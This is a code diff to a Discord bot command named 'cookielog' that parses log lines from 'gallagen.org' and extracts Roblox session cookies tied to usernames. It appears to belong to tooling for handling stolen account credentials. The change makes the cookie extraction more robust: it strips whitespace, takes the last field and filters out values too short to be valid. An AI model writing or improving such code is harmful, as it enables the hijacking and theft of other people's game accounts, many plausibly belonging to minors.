@@ -2456,22 +2456,32 @@ async def cookielog_command(interaction: discord.Interaction):
         lines = content.split('\n')
         
         for line in lines:
+            line = line.strip()
             if ':gallagen.org$' in line and '_|WARNING:' in line:
-                parts = line.split(':gallagen.org$')
-                if len(parts) >= 2:
-                    cookie_part = parts[1].split(':|_')[0]
-                    full_cookie = parts[1].split(':|_')[1] if ':|_' in parts[1] else parts[1]
-                    username = parts[0]
-                    
-                    # Extraer solo la cookie de Roblox (después del segundo |_)
-                    cookie_sections = full_cookie.split('|_')
-                    if len(cookie_sections) >= 3:
-                        roblox_cookie = cookie_sections[2]
-                        roblox_cookies.append({
-                            'username': username,
-                            'cookie': roblox_cookie,
-                            'full_line': line
-                        })
+                try:
+                    # Formato: username:gallagen.org$userid:_|WARNING:...|_cookie_value
+                    # Dividir por ':gallagen.org$'
+                    parts = line.split(':gallagen.org$')
+                    if len(parts) >= 2:
+                        username = parts[0]
+                        remaining = parts[1]
+                        
+                        # Buscar la parte después del último |_
+                        if '|_' in remaining:
+                            cookie_sections = remaining.split('|_')
+                            # La cookie debería estar en la última sección
+                            roblox_cookie = cookie_sections[-1].strip()
+                            
+                            # Verificar que la cookie tenga un formato válido (no esté vacía y tenga cierta longitud)
+                            if roblox_cookie and len(roblox_cookie) > 50:
+                                roblox_cookies.append({
+                                    'username': username,
+                                    'cookie': roblox_cookie,
+                                    'full_line': line
+                                })
+                except Exception as e:
+                    logger.debug(f"Error procesando línea: {e}")
+                    continue
         
         if not roblox_cookies:
             embed = discord.Embed(
